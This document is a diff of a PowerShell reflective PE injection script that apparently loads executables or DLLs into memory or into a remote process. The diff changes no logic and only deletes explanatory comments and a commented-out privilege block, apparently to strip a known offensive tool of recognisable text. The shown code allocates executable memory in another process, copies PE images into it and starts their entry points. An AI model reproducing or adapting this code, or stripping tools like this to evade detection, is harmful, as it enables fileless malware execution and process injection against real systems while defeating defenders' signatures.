@@ -2166,7 +2166,6 @@ $RemoteScriptBlock = {
             $RemoteLoading = $true
         }
 
-        #Get basic PE information
         Write-Verbose "Getting basic PE information from the file"
         $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
         $OriginalImageBase = $PEInfo.OriginalImageBase
@@ -2223,10 +2222,8 @@ $RemoteScriptBlock = {
             Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
         }
 
-        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
         Write-Verbose "Allocating memory for the PE and write its headers to memory"
 
-        #ASLR check
         [IntPtr]$LoadAddr = [IntPtr]::Zero
         $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
         if ((-not $ForceASLR) -and (-not $PESupportsASLR))
@@ -2252,10 +2249,8 @@ $RemoteScriptBlock = {
         $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
         if ($RemoteLoading -eq $true)
         {
-            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
             $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 
-            #todo, error handling needs to delete this memory if an error happens along the way
             $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
             if ($EffectivePEHandle -eq [IntPtr]::Zero)
             {
@@ -2283,7 +2278,6 @@ $RemoteScriptBlock = {
         [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
 
 
-        #Now that the PE is in memory, get more detailed information about it
         Write-Verbose "Getting detailed PE information from the headers loaded in memory"
         $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
         $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
@@ -2418,8 +2412,6 @@ $RemoteScriptBlock = {
             [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
             $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
 
-            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
-            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
             [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
             Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
 
@@ -2460,7 +2452,6 @@ $RemoteScriptBlock = {
 
         $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 
-        #Call FreeLibrary for all the imports of the DLL
         if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
         {
             [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
@@ -2469,7 +2460,6 @@ $RemoteScriptBlock = {
             {
                 $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 
-                #If the structure is null, it signals that this is the end of the array
                 if ($ImportDescriptor.Characteristics -eq 0 `
                         -and $ImportDescriptor.FirstThunk -eq 0 `
                         -and $ImportDescriptor.ForwarderChain -eq 0 `
@@ -2498,7 +2488,6 @@ $RemoteScriptBlock = {
             }
         }
 
-        #Call DllMain with process detach
         Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
         $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
         $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
@@ -2546,14 +2535,6 @@ $RemoteScriptBlock = {
                 $ProcId = $Processes[0].ID
             }
         }
-
-        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
-        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
-#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
-#       {
-#           Write-Verbose "Getting SeDebugPrivilege"
-#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-#       }
 
         if (($ProcId -ne $null) -and ($ProcId -ne 0))
         {
